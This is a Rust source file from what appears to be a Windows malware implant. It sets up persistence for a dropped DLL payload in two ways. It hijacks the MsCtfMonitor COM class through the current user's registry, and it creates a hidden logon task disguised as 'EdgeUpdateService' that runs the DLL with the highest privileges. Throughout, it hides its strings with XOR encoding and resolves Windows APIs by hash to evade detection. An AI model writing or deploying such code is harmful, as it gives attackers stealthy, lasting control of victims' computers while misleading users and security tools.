//! # Persistence (Dynamic API) - HARDENED
//!
//! NO winreg or windows crate = minimal import table.
//! - COM Hijacking: Native Registry API via api_resolver
//! - Scheduled Task: schtasks.exe via CreateProcessA

use std::ffi::c_void;
use std::ptr;


use super::api_resolver::{self, djb2};

/// Simple XOR decode helper (Key: 0x55)
fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

/// Convert string to wide (UTF-16) for Windows API
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// Registry API types
type RegCreateKeyExW = unsafe extern "system" fn(
    hKey: isize, lpSubKey: *const u16, Reserved: u32, lpClass: *const u16,
    dwOptions: u32, samDesired: u32, lpSecurityAttributes: *const c_void,
    phkResult: *mut isize, lpdwDisposition: *mut u32
) -> i32;

type RegSetValueExW = unsafe extern "system" fn(
    hKey: isize, lpValueName: *const u16, Reserved: u32, dwType: u32,
    lpData: *const u8, cbData: u32
) -> i32;

type RegCloseKey = unsafe extern "system" fn(hKey: isize) -> i32;

type CreateProcessA = unsafe extern "system" fn(
    lpApplicationName: *const u8, lpCommandLine: *mut u8,
    lpProcessAttributes: *const c_void, lpThreadAttributes: *const c_void,
    bInheritHandles: i32, dwCreationFlags: u32,
    lpEnvironment: *const c_void, lpCurrentDirectory: *const u8,
    lpStartupInfo: *const StartupInfo, lpProcessInformation: *mut ProcessInfo
) -> i32;

// Minimal structures for CreateProcessA
#[repr(C)]
struct StartupInfo {
    cb: u32,
    reserved: *const u8,
    desktop: *const u8,
    title: *const u8,
    x: u32, y: u32, x_size: u32, y_size: u32,
    x_count_chars: u32, y_count_chars: u32,
    fill_attribute: u32, flags: u32,
    show_window: u16, reserved2: u16,
    reserved3: *const u8, std_input: isize, std_output: isize, std_error: isize,
}

#[repr(C)]
struct ProcessInfo {
    process: isize, thread: isize, process_id: u32, thread_id: u32,
}

// Hashes
const HASH_REG_CREATE_KEY_EX_W: u32 = 0x9CB4594C;
const HASH_REG_SET_VALUE_EX_W: u32 = 0x02ACF196;
const HASH_REG_CLOSE_KEY: u32 = 0x66579AD4;
const HASH_CREATE_PROCESS_A: u32 = 0x5768C90B;
const HASH_ADVAPI32: u32 = 0x03C6B585;

const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
const KEY_ALL_ACCESS: u32 = 0xF003F;
const REG_SZ: u32 = 1;
const CREATE_NO_WINDOW: u32 = 0x08000000;

// NOTE: apply_persistence_triad() REMOVED - Legacy EXE-based persistence
// Now only apply_persistence_for_dll() is used by dropper.rs


/// Apply persistence for DLL payload (CORRECT for COM Hijacking)
/// This is the proper way - COM requires DLL, not EXE
pub fn apply_persistence_for_dll(dll_path: &str) {
    crate::k::debug::log_op!("Persistence", "Setting up DLL Persistence...");
    
    // 1. COM Hijacking with DLL path (CORRECT)
    let _ = setup_com_hijacking(dll_path);
    
    // 2. Scheduled Task uses rundll32 to load DLL
    let _ = setup_scheduled_task_for_dll(dll_path);
}

/// Setup Scheduled Task for DLL using rundll32
fn setup_scheduled_task_for_dll(dll_path: &str) -> Result<(), String> {
    crate::k::debug::log_op!("Persistence", "Setting up Scheduled Task (DLL)...");
    
    #[cfg(target_os = "windows")]
    unsafe {
        use super::api_resolver::{self, resolve_api, HASH_KERNEL32};
        use std::ptr;
        
        // Build command: rundll32.exe "dll_path",DllGetClassObject
        // Obfuscated: "rundll32.exe" XOR 0x55
        let rundll = x(&[0x27, 0x20, 0x3B, 0x31, 0x39, 0x39, 0x66, 0x67, 0x7B, 0x30, 0x23, 0x30]);
        let cmd = format!("{} \"{}\",DllGetClassObject", rundll, dll_path);
        
        crate::k::debug::log_detail!("Task Cmd: {}", cmd);
        
        // Use schtasks.exe to create task
        // schtasks /create /tn "EdgeUpdateService" /tr "..." /sc onlogon /rl highest /f
        let schtasks = x(&[0x26, 0x36, 0x3D, 0x21, 0x34, 0x26, 0x3E, 0x26]); // schtasks
        let task_name = x(&[0x10, 0x31, 0x32, 0x30, 0x00, 0x25, 0x31, 0x34, 0x21, 0x30, 0x06, 0x30, 0x27, 0x23, 0x3C, 0x36, 0x30]); // EdgeUpdateService
        
        let full_cmd = format!(
            "{} /create /tn \"{}\" /tr \"{}\" /sc onlogon /rl highest /f",
            schtasks, task_name, cmd
        );
        
        crate::k::debug::log_detail!("SchTask: {}", full_cmd);
        
        // Execute via CreateProcessA
        type CreateProcessA = unsafe extern "system" fn(
            *const u8, *mut u8, *const std::ffi::c_void, *const std::ffi::c_void,
            i32, u32, *const std::ffi::c_void, *const u8,
            *const std::ffi::c_void, *mut [usize; 4]
        ) -> i32;
        
        if let Some(create_proc) = resolve_api::<CreateProcessA>(HASH_KERNEL32, 0x5768C90B) {
            let mut cmd_bytes: Vec<u8> = full_cmd.bytes().chain(std::iter::once(0)).collect();
            let mut pi: [usize; 4] = [0; 4];
            let si = [0u8; 68]; // STARTUPINFOA zeroed
            
            let _ = create_proc(
                ptr::null(), cmd_bytes.as_mut_ptr(), ptr::null(), ptr::null(),
                0, 0x08000000, ptr::null(), ptr::null(), // CREATE_NO_WINDOW
                si.as_ptr() as *const _, &mut pi
            );
        }
    }
    
    Ok(())
}


/// Setup COM Hijacking using native Registry API
fn setup_com_hijacking(exe_path: &str) -> Result<(), String> {
    crate::k::debug::log_op!("Persistence", "Setting up COM Hijack...");
    #[cfg(target_os = "windows")]
    unsafe {
        // Target CLSID: MsCtfMonitor (Language Bar Monitor)
        // {F5078F32-C551-11d3-89B9-0000F81FE221}
        let clsid = "{F5078F32-C551-11d3-89B9-0000F81FE221}"; 
        
        // Build path: Software\Classes\CLSID\{...}\InprocServer32
        // Obfuscation remains valid for Key Names (Software, Classes, CLSID, InprocServer32)
        let p1 = x(&[0x06, 0x3A, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30]); // Software
        let p2 = x(&[0x16, 0x39, 0x34, 0x26, 0x26, 0x30, 0x26]);       // Classes
        let p3 = x(&[0x16, 0x19, 0x06, 0x1C, 0x11]);                   // CLSID
        let inproc = x(&[0x1C, 0x3B, 0x25, 0x27, 0x3A, 0x36, 0x06, 0x30, 0x27, 0x23, 0x30, 0x27, 0x66, 0x67]); // InprocServer32
        
        let path = format!("{}\\{}\\{}\\{}\\{}", p1, p2, p3, clsid, inproc);
        crate::k::debug::log_detail!("COM Key: {}", path);
        let path_wide = to_wide(&path);
        
        // Load advapi32 if needed
        ensure_advapi32_loaded()?;
        
        let advapi32 = api_resolver::get_module_by_hash(HASH_ADVAPI32)
            .ok_or("E30")?;

        let reg_create: RegCreateKeyExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_CREATE_KEY_EX_W)
            .map(|p| std::mem::transmute(p))
            .ok_or("E31")?;
            
        let reg_set: RegSetValueExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_SET_VALUE_EX_W)
            .map(|p| std::mem::transmute(p))
            .ok_or("E32")?;
            
        let reg_close: RegCloseKey = api_resolver::get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY)
            .map(|p| std::mem::transmute(p))
            .ok_or("E33")?;

        // Create key
        let mut hkey: isize = 0;
        let mut disposition: u32 = 0;
        
        let status = reg_create(
            HKEY_CURRENT_USER, path_wide.as_ptr(), 0, ptr::null(),
            0, KEY_ALL_ACCESS, ptr::null(), &mut hkey, &mut disposition
        );
        
        if status != 0 {
            return Err(format!("RegCreateKeyExW: {}", status));
        }

        // Set default value (empty name = default)
        let empty_name: [u16; 1] = [0];
        let exe_wide = to_wide(exe_path);
        
        let status = reg_set(
            hkey, empty_name.as_ptr(), 0, REG_SZ,
            exe_wide.as_ptr() as *const u8, (exe_wide.len() * 2) as u32
        );
        
        if status != 0 {
            reg_close(hkey);
            crate::k::debug::log_err!(format!("COM SetValue failed: {}", status));
            return Err(format!("E32:{}", status));
        }
        
        // Set ThreadingModel = "Both" (required for InprocServer32)
        // Obfuscated: "ThreadingModel" XOR 0x55
        let tm_name = to_wide(&x(&[0x01, 0x3D, 0x27, 0x30, 0x34, 0x31, 0x3C, 0x3B, 0x32, 0x18, 0x3A, 0x31, 0x30, 0x39]));
        // Obfuscated: "Both" XOR 0x55
        let tm_value = to_wide(&x(&[0x17, 0x3A, 0x21, 0x3D]));
        let _ = reg_set(
            hkey, tm_name.as_ptr(), 0, REG_SZ,
            tm_value.as_ptr() as *const u8, (tm_value.len() * 2) as u32
        );
        
        reg_close(hkey);


        Ok(())
    }
    
    #[cfg(not(target_os = "windows"))]
    Ok(())
}

// NOTE: setup_scheduled_task(exe_path) REMOVED - Legacy EXE scheduler
// Now only setup_scheduled_task_for_dll() is used (lines 95-142 above)


/// Ensure advapi32.dll is loaded
#[cfg(target_os = "windows")]
unsafe fn ensure_advapi32_loaded() -> Result<(), String> {
    if api_resolver::get_module_by_hash(HASH_ADVAPI32).is_some() {
        return Ok(());
    }
    
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *const c_void;
    let load_lib: LoadLibraryA = api_resolver::resolve_api(
        api_resolver::HASH_KERNEL32, 
        api_resolver::HASH_LOAD_LIBRARY_A
    ).ok_or_else(|| "E01".to_string())?;
    
    // XOR encoded "advapi32.dll\0" with 0x55
    let dll_enc: [u8; 13] = [0x34, 0x31, 0x23, 0x34, 0x27, 0x3C, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
    let dll: Vec<u8> = dll_enc.iter().map(|b| b ^ 0x55).collect();
    let result = load_lib(dll.as_ptr());
    
    if result.is_null() {
        Err("E02".to_string())
    } else {
        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
unsafe fn ensure_advapi32_loaded() -> Result<(), String> { Ok(()) }
